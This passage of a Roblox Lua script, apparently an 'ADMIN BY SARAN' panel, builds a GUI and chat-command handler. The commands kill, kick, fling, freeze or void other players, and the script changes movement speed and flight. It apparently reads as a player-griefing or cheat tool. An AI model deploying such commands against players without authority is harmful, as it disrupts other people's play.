            box:Destroy()
        end)
    end)
end

bindInput(r1, spinVal, 25, function(v) Move.SpinSpeed = v; if Move.SpinOn then setSpin(true, v) end end)
bindInput(r2, flyVal, 60, function(v) Move.FlySpeed = v end)
bindInput(r3, walkVal, 16, function(v) setWalkSpeed(v) end)
bindInput(r4, jumpVal, 50, function(v) setJumpPower(v) end)

local resetBtn = Instance.new("TextButton")
resetBtn.Size = UDim2.new(1, 0, 0, 36)
resetBtn.BackgroundColor3 = T.Red
resetBtn.BackgroundTransparency = 0.2
resetBtn.Text = "♻️ RESET ALL"
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 11
resetBtn.TextColor3 = T.TP
resetBtn.LayoutOrder = 5
resetBtn.Parent = MovePage
corner(resetBtn, 8)
resetBtn.MouseButton1Click:Connect(function()
    resetMove()
    spinVal.Text = "25"
    flyVal.Text = "60"
    walkVal.Text = "16"
    jumpVal.Text = "50"
end)

------------------------------------------------------------------
-- TAB 4: CONSOLE
------------------------------------------------------------------
local ConsolePage = Instance.new("Frame")
ConsolePage.Size = UDim2.new(1, 0, 1, 0)
ConsolePage.BackgroundTransparency = 1
ConsolePage.Visible = false
ConsolePage.Parent = Content

local ConsoleScroll = Instance.new("ScrollingFrame")
ConsoleScroll.Size = UDim2.new(1, 0, 1, -40)
ConsoleScroll.BackgroundColor3 = T.BG
ConsoleScroll.BackgroundTransparency = 0.3
ConsoleScroll.BorderSizePixel = 0
ConsoleScroll.ScrollBarThickness = 2
ConsoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
ConsoleScroll.Parent = ConsolePage
corner(ConsoleScroll, 10)

local CLayout = Instance.new("UIListLayout")
CLayout.Padding = UDim.new(0, 4)
CLayout.SortOrder = Enum.SortOrder.LayoutOrder
CLayout.Parent = ConsoleScroll
local CPad = Instance.new("UIPadding"); CPad.PaddingTop=UDim.new(0,6); CPad.PaddingLeft=UDim.new(0,6); CPad.PaddingRight=UDim.new(0,6); CPad.Parent = ConsoleScroll

local function log(msg, color)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, 0, 0, 0)
    l.AutomaticSize = Enum.AutomaticSize.Y
    l.BackgroundTransparency = 1
    l.Text = "→ " .. msg
    l.TextColor3 = color or T.TS
    l.Font = Enum.Font.Code
    l.TextSize = 10.5
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.TextWrapped = true
    l.Parent = ConsoleScroll
    task.defer(function() ConsoleScroll.CanvasPosition = Vector2.new(0, ConsoleScroll.AbsoluteCanvasSize.Y) end)
end

log("ADMIN BY SARAN loaded", T.Green)
log("Type ;cmds in chat to see all commands", T.Cyan)

local CmdFrame = Instance.new("Frame")
CmdFrame.Size = UDim2.new(1, 0, 0, 32)
CmdFrame.Position = UDim2.new(0, 0, 1, -34)
CmdFrame.BackgroundColor3 = T.Card
CmdFrame.BackgroundTransparency = 0.2
CmdFrame.Parent = ConsolePage
corner(CmdFrame, 8)

local InputBox = Instance.new("TextBox")
InputBox.Size = UDim2.new(1, -50, 1, 0)
InputBox.Position = UDim2.new(0, 8, 0, 0)
InputBox.BackgroundTransparency = 1
InputBox.Text = ""
InputBox.PlaceholderText = ";kill all"
InputBox.PlaceholderColor3 = T.TM
InputBox.TextColor3 = T.TP
InputBox.Font = Enum.Font.Code
InputBox.TextSize = 11
InputBox.TextXAlignment = Enum.TextXAlignment.Left
InputBox.ClearTextOnFocus = false
InputBox.Parent = CmdFrame

local SendBtn = Instance.new("TextButton")
SendBtn.Size = UDim2.fromOffset(40, 24)
SendBtn.Position = UDim2.new(1, -44, 0.5, -12)
SendBtn.BackgroundColor3 = T.Cyan
SendBtn.BackgroundTransparency = 0.2
SendBtn.Text = "SEND"
SendBtn.Font = Enum.Font.GothamBold
SendBtn.TextSize = 9
SendBtn.TextColor3 = T.BG
SendBtn.AutoButtonColor = false
SendBtn.Parent = CmdFrame
corner(SendBtn, 6)

local function runChatCommand(text)
    if not isAdmin() then log("⚠ Admin only", T.Red); return end
    text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if text:sub(1, 1) == ";" then text = text:sub(2) end
    local args = {}
    for w in text:gmatch("%S+") do table.insert(args, w) end
    local cmd = (args[1] or ""):upper()
    local target = args[2] or "all"
    local param = args[3] or ""
    
    local validCmds = {
        KILL=true, KICK=true, FREEZE=true, UNFREEZE=true,
        FLING=true, VOID=true, BRING=true, SKY=true, UNLOAD=true,
        SPIN=true, UNSPIN=true, SPEED=true, JUMP=true,
        FLY=true, UNFLY=true, RESET=true,
    }
    if not validCmds[cmd] then log("✗ Unknown command: " .. cmd, T.Red); return end
    
    if target:lower() == "all" or target:lower() == LP.Name:lower() then
        executeCmd(cmd, target, param, LP.Name)
    end
    local ok = sendCmd(cmd, target, param)
    log((ok and "✓ " or "✗ ") .. cmd .. " → " .. target, ok and T.Green or T.Red)
end

SendBtn.MouseButton1Click:Connect(function() runChatCommand(InputBox.Text); InputBox.Text = "" end)
InputBox.FocusLost:Connect(function(e) if e then runChatCommand(InputBox.Text); InputBox.Text = "" end end)

------------------------------------------------------------------
-- TARGET BAR (ด้านล่าง)
------------------------------------------------------------------
local TargetBar = Instance.new("Frame")
TargetBar.Size = UDim2.new(1, -16, 0, 34)
TargetBar.Position = UDim2.new(0, 8, 1, -42)
TargetBar.BackgroundColor3 = T.Card
TargetBar.BackgroundTransparency = 0.1
TargetBar.BorderSizePixel = 0
TargetBar.Parent = Win
corner(TargetBar, 8)
stroke(TargetBar, T.Magenta, 1, 0.4)

local TargetLbl = Instance.new("TextLabel")
TargetLbl.Size = UDim2.new(1, -60, 1, 0)
TargetLbl.Position = UDim2.new(0, 10, 0, 0)
TargetLbl.BackgroundTransparency = 1
TargetLbl.Text = "🎯 No Target"
TargetLbl.Font = Enum.Font.GothamBold
TargetLbl.TextSize = 11
TargetLbl.TextColor3 = T.TS
TargetLbl.TextXAlignment = Enum.TextXAlignment.Left
TargetLbl.Parent = TargetBar

local ScanBtn = Instance.new("TextButton")
ScanBtn.Size = UDim2.fromOffset(50, 22)
ScanBtn.Position = UDim2.new(1, -56, 0.5, -11)
ScanBtn.BackgroundColor3 = T.Cyan
ScanBtn.BackgroundTransparency = 0.2
ScanBtn.Text = "SCAN"
ScanBtn.Font = Enum.Font.GothamBold
ScanBtn.TextSize = 9.5
ScanBtn.TextColor3 = T.BG
ScanBtn.AutoButtonColor = false
ScanBtn.Parent = TargetBar
corner(ScanBtn, 6)

function updateTargetBar()
    if SelectedPlayer then
        TargetLbl.Text = "🎯 @" .. SelectedPlayer
        TargetLbl.TextColor3 = T.Magenta
    else
        TargetLbl.Text = "🎯 No Target"
        TargetLbl.TextColor3 = T.TS
    end
end

ScanBtn.MouseButton1Click:Connect(function()
    sendBeacon()
    log("Beacon sent...", T.Cyan)
    task.delay(0.5, rebuildPlayers)
end)

------------------------------------------------------------------
-- TAB SWITCH
------------------------------------------------------------------
local function switchTab(id)
    ActiveTab = id
    for tid, tdata in pairs(TabButtons) do
        local on = (tid == id)
        tdata.btn.BackgroundTransparency = on and 0.1 or 1
        tdata.btn.BackgroundColor3 = on and T.Cyan or T.Card
        tdata.btn.TextColor3 = on and T.BG or T.TM
    end
    PlayersPage.Visible = (id == "players")
    ActionsPage.Visible = (id == "actions")
    MovePage.Visible = (id == "move")
    ConsolePage.Visible = (id == "console")
end
for tid, tdata in pairs(TabButtons) do
    tdata.btn.MouseButton1Click:Connect(function() switchTab(tid) end)
end
switchTab("players")

------------------------------------------------------------------
-- DRAG & FAB
------------------------------------------------------------------
local dragging = false
local dStart, wStart
Header.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging = true; dStart = i.Position; wStart = Win.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - dStart
        Win.Position = UDim2.new(wStart.X.Scale, wStart.X.Offset + d.X, wStart.Y.Scale, wStart.Y.Offset + d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)

FAB.MouseButton1Click:Connect(function()
    Win.Visible = not Win.Visible
    if Win.Visible then tw(Win, 0.2, {BackgroundTransparency = 0.05}); rebuildPlayers() end
end)
CloseBtn.MouseButton1Click:Connect(function() tw(Win, 0.15, {BackgroundTransparency = 1}); task.delay(0.15, function() Win.Visible = false end) end)

------------------------------------------------------------------
-- BEACON LOOP & CHAT COMMANDS
------------------------------------------------------------------
task.spawn(function()
    task.wait(2)
    while Root.Parent do
        pcall(function() sendBeacon() end)
        task.wait(CFG.BCN_EVERY)
    end
end)

LP.Chatted:Connect(function(msg)
    if not isAdmin() then return end
    if msg:sub(1, 1) ~= ";" then return end
    
    -- เพิ่มคำสั่ง ;cmds
    local lowerMsg = msg:lower()
    if lowerMsg == ";cmds" or lowerMsg == ";commands" then
        local cmdList = "Available Commands:\n" ..
            "kill, kick, freeze, unfreeze,\n" ..
            "fling, void, bring, sky,\n" ..
            "spin <speed>, unspin, speed <num>,\n" ..
            "jump <num>, fly <speed>, unfly,\n" ..
            "unload, reset\n" ..
            "Usage: ;kill all  |  ;speed john 100"
        -- ส่งลง Console UI
        if Win and ConsolePage then
            log("=== COMMAND LIST ===", T.Cyan)
            for _, v in ipairs(string.split(cmdList, "\n")) do log(v, T.TS) end
        end
        -- แจ้งเตือน
        StarterGui:SetCore("SendNotification", {
            Title = "ADMIN BY SARAN",
            Text = cmdList,
            Duration = 10
        })
        return
    end

    task.spawn(function()
        runChatCommand(msg)
        switchTab("console")
        if not Win.Visible then Win.Visible = true end
    end)
end)

-- Auto Refresh
task.spawn(function()
    while Root.Parent do
        task.wait(4)
        if Win.Visible and ActiveTab == "players" then pcall(rebuildPlayers) end
    end
end)

updateTargetBar()
print("[ADMIN BY SARAN] Loaded. UI is compact.")